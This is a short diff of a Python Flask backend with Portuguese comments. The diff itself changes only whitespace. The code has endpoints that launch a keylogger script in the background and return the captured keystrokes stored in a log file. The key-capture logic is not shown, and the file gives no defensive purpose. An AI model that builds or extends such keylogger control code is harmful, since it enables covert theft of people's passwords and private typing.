@@ -18,10 +18,10 @@ keylogger_process = None
 def execute_script():
     """Executa o keylogger.py em background"""
     global keylogger_process
-    
+
     try:
         data = request.json or {}
-        
+
         # Verifica se já está rodando
         if keylogger_process and keylogger_process.poll() is None:
             return jsonify({
@@ -104,12 +104,12 @@ def get_status():
 def get_log():
     """Retorna o conteúdo do arquivo de log"""
     log_file = os.path.join(os.path.dirname(__file__), 'captured_keys.txt')
-    
+
     try:
         if os.path.exists(log_file):
             with open(log_file, 'r', encoding='utf-8') as f:
                 content = f.read()
-            
+
             return jsonify({
                 'success': True,
                 'content': content,
@@ -120,7 +120,7 @@ def get_log():
                 'success': False,
                 'message': 'Arquivo de log não encontrado'
             }), 404
-            
+
     except Exception as e:
         return jsonify({
             'success': False,
